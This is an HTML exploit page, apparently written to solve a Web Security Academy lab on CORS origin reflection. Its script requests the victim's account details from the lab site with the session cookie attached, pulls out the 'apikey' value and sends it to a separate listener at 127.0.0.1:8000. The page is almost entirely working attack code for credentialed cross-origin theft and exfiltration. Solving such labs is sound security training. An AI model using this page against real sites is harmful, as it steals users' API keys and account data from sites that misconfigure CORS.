<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CORS vulnerability with basic origin reflection</title>

	<style type="text/css">
	body {
		margin:40px auto;
		max-width:650px;
		line-height:1.6;
		font-size:18px;
		color:#444;
		padding:0 10px;
		background: #eee;
	}

	h1,h2,h3 {
		line-height:1.2}
	}
	</style>

</head>
<body>

<h1>CORS vulnerability with basic origin reflection</h1>

<script type="text/javascript">
	console.log("Let's exploit this");

	url = 'https://0af1003b04bde6fe8152a277009b00c8.web-security-academy.net/accountDetails';

	var page = fetch (url, {
		credentials: 'include'  // send the session cookie
	})
	.then(res => res.json())
	.then( function (data){
		console.log(data);
		fetch('http://127.0.0.1:8000/?apikey=' + data['apikey'], {mode: 'no-cors'})
	})


	// Lets' XMLHTTP Request instead
	// var req = new XMLHTTPRequest();
	// req.onload = reqListener;

	// function reqListener() {
	// 	console.log(this.responseText)
	// }
</script>


</body>
</html>